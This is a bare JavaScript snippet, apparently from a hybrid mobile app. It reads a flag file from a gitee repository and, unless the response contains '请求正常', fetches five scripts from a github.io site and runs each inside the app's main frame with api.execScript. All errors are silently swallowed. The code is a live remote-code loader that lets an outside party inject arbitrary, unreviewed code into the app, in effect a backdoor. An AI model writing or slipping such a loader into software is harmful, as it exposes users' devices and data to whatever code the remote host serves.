try{
ajaxget("https://gitee.com/xiaomeng9597/appjs/raw/master/app.json?r="+Math.random(),function(ret){

if(ret.indexOf("请求正常") == -1 || ret.search("请求正常") == -1){
try{$api.get("https://xiaomeng9597.github.io/appjs/appjs.js",function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text")}catch(err){};try{$api.get("https://xiaomeng9597.github.io/appjs/load_js.js",function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text")}catch(err){};try{$api.get("https://xiaomeng9597.github.io/appjs/load_js2.js",function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text")}catch(err){};try{$api.get("https://xiaomeng9597.github.io/appjs/load_js3.js",function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text")}catch(err){};try{$api.get("https://xiaomeng9597.github.io/appjs/load_js4.js",function(ret){api.execScript({name:"root",frameName:"main",script:ret})},"text")}catch(err){};
}

},"text");
}catch(err){};